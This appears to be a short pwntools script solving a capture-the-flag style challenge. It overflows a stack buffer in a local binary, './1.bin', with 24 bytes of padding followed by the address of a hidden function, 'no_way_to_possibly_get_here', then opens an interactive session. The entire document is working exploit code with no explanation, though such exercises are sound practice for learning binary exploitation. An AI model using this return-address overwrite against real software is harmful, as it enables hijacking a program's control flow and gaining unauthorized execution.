
from pwn import *

e = ELF("./1.bin")
ptr = e.symbols["no_way_to_possibly_get_here"]

p = process("./1.bin")

p.send(b"A"*24 + p64(ptr) + b"\n")

p.interactive()
